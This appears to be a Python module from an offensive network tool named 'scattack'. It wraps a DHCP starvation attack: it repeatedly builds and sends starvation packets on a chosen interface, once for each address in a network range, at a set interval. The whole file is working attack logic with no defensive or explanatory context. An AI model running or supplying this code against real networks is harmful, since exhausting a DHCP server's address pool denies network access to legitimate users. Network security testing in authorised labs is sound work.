from time import sleep
from typing import Any
from scattack.core import send_packet
from scattack.core.dhcp_starve import create_dhcp_starve_packet

from scapy.layers.l2 import Net


def create_dhcp_stave_command(
    *,
    net_range: str,
    target_mac: str,
    iface: str,
    interval: float,
) -> dict[str, Any]:
    def send(iface: str, target_mac: str, interval: float = interval):
        pkt = create_dhcp_starve_packet(target_mac=target_mac)
        send_packet(pkt, iface)
        sleep(interval)

    i = Net(net_range).count

    def condition():
        nonlocal i
        if i == 0:
            return False
        else:
            i -= 1
            return True

    return {
        "fun": send,
        "args": (iface, target_mac),
        "kwargs": {"interval": interval},
        "condition": condition,
    }
